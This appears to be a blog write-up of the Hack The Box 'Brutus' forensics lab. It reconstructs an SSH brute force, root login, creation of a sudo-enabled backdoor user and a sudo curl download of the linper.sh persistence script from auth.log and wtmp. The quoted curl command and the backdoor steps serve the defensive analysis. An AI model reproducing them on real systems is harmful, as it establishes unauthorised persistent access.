---
title: "HTB Sherlock: Brutus — DFIR Writeup"
date: 2026-06-09 09:00:00 +0300
categories: [Labs, DFIR]
tags: [hackthebox, dfir, forensics, auth.log, wtmp, brute force, linux, soc, blue team, mitre, persistence]
description: A full walkthrough of the Hack The Box Brutus Sherlock challenge. Two log files, one compromised server, and a complete attacker timeline reconstructed from scratch using auth.log and wtmp.
image:
  path: https://images.unsplash.com/photo-1629654291663-b91ad427698f?w=1200&h=500&fit=crop&q=80
  alt: Linux authentication logs under forensic review
---

## Overview

**Platform:** Hack The Box Sherlocks
**Category:** DFIR (Digital Forensics and Incident Response)
**Difficulty:** Very Easy
**Status:** Completed

Brutus is a beginner-friendly DFIR challenge that simulates a real-world Linux server compromise. The investigation revolves around two forensic artifacts: `auth.log` and `wtmp`. The goal is to reconstruct the attacker's actions from initial brute force all the way through to persistence.

---

## Artifacts

| File | Description |
|---|---|
| `auth.log` | Linux authentication log recording SSH logins, sudo usage, and user creation |
| `wtmp` | Binary file tracking all login and logout sessions on the system |

---

## Investigation

### Task 1 — Identifying the Attacker's IP

The first step was scanning `auth.log` for brute force patterns. A brute force attack generates a large number of failed authentication attempts in a short time window.

Filtering for `Failed password` entries revealed a flood of SSH failures all originating from a single IP address starting at `06:31:31`:

```
sshd: Invalid user admin from 65.2.161.68
sshd: Failed password for backup from 65.2.161.68
sshd: Failed password for root from 65.2.161.68
```

The attacker cycled through multiple usernames including `admin`, `backup`, `server_adm`, `svc_account`, and `root`.

**Finding: `65.2.161.68`**

---

### Task 2 — Compromised Account

After hundreds of failed attempts, the attacker succeeded at `06:31:40`:

```
sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
```

The root account was compromised directly. No privilege escalation needed since the attacker brute-forced the highest-privilege account on the system.

**Finding: `root`**

---

### Task 3 — Manual Login Timestamp (from wtmp)

The `wtmp` binary was parsed using the Python script provided in the challenge. While `auth.log` shows the authentication time, `wtmp` records when the actual terminal session was established, which can differ slightly.

The wtmp output showed:

```
USER  root  pts/1  65.2.161.68  2024/03/06 06:32:45 UTC
```

This distinction matters in real investigations. The authentication event and the session establishment event are two separate log entries. Knowing both helps reconstruct an accurate timeline.

**Finding: `2024-03-06 06:32:45 UTC`**

---

### Task 4 — SSH Session Number

Back in `auth.log`, the line immediately following the accepted password entry showed:

```
systemd-logind[411]: New session 37 of user root.
```

Session numbers are useful for correlating events across log sources. When you see `Removed session 37` later, you know exactly when this specific attacker session ended.

**Finding: `37`**

---

### Task 5 — Backdoor Account

While operating as root, the attacker created a new user at `06:34:18`:

```
useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie
```

Then at `06:35:15` elevated its privileges:

```
usermod[2628]: add 'cyberjunkie' to group 'sudo'
```

This is a classic persistence technique. By creating a backdoor account with sudo rights, the attacker ensures they can return to the system even if the root password is changed. The new account looks like a legitimate local user to anyone not paying close attention to `useradd` events.

**Finding: `cyberjunkie`**

---

### Task 6 — MITRE ATT&CK Sub-Technique

Creating a local user account for persistence maps directly to a documented MITRE technique:

**T1136.001 — Create Account: Local Account**

In the ATT&CK framework, T1136 covers account creation as a persistence mechanism. The `.001` sub-technique specifically covers local accounts as opposed to domain accounts (`.002`) or cloud accounts (`.003`). Mapping observed behaviour to ATT&CK is a core SOC analyst skill because it provides a common language for reporting and helps correlate activity across different incidents.

---

### Task 7 — Session End Time

The attacker's root session (session 37) ended at:

```
sshd[2491]: pam_unix(sshd:session): session closed for user root
systemd-logind[411]: Removed session 37.
```

**Finding: `2024-03-06 06:37:24 UTC`**

The session lasted just under five minutes. Short, focused sessions are a common attacker pattern. Get in, establish persistence, get out.

---

### Task 8 — Sudo Command Executed by Backdoor Account

After disconnecting from root, the attacker logged back in as `cyberjunkie` at `06:37:34` and ran:

```
sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

`linper.sh` is a known Linux persistence script from the `montysecurity` repository. By downloading it with sudo privileges, the attacker was staging the next phase of the compromise, deepening their foothold on the system.

**Finding: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`**

---

## Summary of Findings

| Task | Finding |
|---|---|
| Attacker IP | 65.2.161.68 |
| Compromised Account | root |
| Login Timestamp (UTC) | 2024-03-06 06:32:45 |
| SSH Session Number | 37 |
| Backdoor Account | cyberjunkie |
| MITRE Technique | T1136.001 |
| Session End Time | 2024-03-06 06:37:24 |
| Sudo Command | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

---

## Attack Timeline

```
06:31:31  Brute force begins from 65.2.161.68
06:31:40  Root account compromised (session 34 - initial probe)
06:32:44  Attacker reconnects via SSH
06:32:45  Terminal session established (session 37)
06:34:18  Backdoor user 'cyberjunkie' created
06:35:15  cyberjunkie added to sudo group
06:37:24  Root session ends
06:37:34  Attacker logs in as cyberjunkie
06:37:57  cyberjunkie reads /etc/shadow via sudo
06:39:38  cyberjunkie downloads linper.sh persistence script
```

---

## Lessons Learned

**auth.log and wtmp together tell the full story.** Neither file alone is enough. auth.log gives you authentication events and sudo commands. wtmp gives you session timing. Cross-referencing both is how you build an accurate timeline.

**Brute force is noisy.** Hundreds of failed logins from a single IP in under 10 seconds is one of the clearest signals in any log file. If you are not alerting on this pattern, you are missing one of the most common initial access techniques in the wild.

**Watch useradd and usermod.** Attackers create backdoor accounts immediately after gaining root. Monitoring for new user creation and privilege group modifications is a high-value detection use case that is easy to implement in any SIEM.

**Map everything to MITRE ATT&CK.** It turns your investigation findings into structured, communicable intelligence. T1110 for brute force, T1136.001 for the backdoor account, T1059 for the curl command execution. Structured mapping makes your reports more useful and your detections more systematic.

**Short sessions are suspicious.** Five minutes of root access, persistence established, disconnect. Attackers who know what they are doing do not linger. Unusual session durations at odd hours from foreign IPs are worth investigating regardless of whether authentication succeeded.

---

## Tools Used

- `grep` and `awk` for log filtering
- Python script (provided in challenge) for wtmp binary parsing
- MITRE ATT&CK Navigator for technique mapping

---

*HTB Sherlock: Brutus | Completed by Glenn | DFIR Lab Writeup*
